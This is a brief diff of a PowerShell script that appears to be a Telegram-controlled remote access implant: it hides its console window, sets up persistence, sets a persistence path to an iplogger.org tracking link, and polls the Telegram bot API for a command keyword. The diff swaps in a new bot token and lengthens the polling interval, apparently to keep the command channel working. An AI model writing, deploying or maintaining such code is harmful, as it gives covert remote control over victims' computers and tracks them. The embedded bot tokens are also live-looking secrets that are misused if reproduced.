@@ -8,7 +8,7 @@ Hide-Console
 Persist
 #KillProc
 
-$BotToken = "1703588475:AAEyrNt2cuj-u6hWO8t3_NIbKLFVQyMDwNE"
+$BotToken = "1674652212:AAH7SBm8S-i1N7gCJYRlEZeyoJBg6eMwy_4"
 $ChatID = '928905258'
 $PersistPath = 'https://iplogger.org/2jaZG6'
 
@@ -221,7 +221,7 @@ Invoke-WebRequest `
 ## WAIT FOR COMMAND ##
 
 #Time to sleep for each loop before checking if a message with the magic word was received
-$LoopSleep = 3
+$LoopSleep = 5
 
 #Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
 $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates" -UserAgent Edge -UseBasicParsing
